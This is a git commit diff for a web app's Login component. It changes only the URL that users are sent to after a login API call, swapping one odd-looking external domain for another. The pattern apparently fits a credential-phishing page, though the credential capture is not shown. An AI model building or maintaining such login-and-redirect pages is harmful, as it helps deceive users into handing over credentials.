6fce8bd51d5c800fc6fc6032ec129b8d4c1af5ca
hurt the kid <127146284+husknet@users.noreply.github.com>
2025-06-26 09:47:52 -0400

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://scar.azuz-nutty.shop/';
+      window.location.href = 'https://scn.drodge-webview.online/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
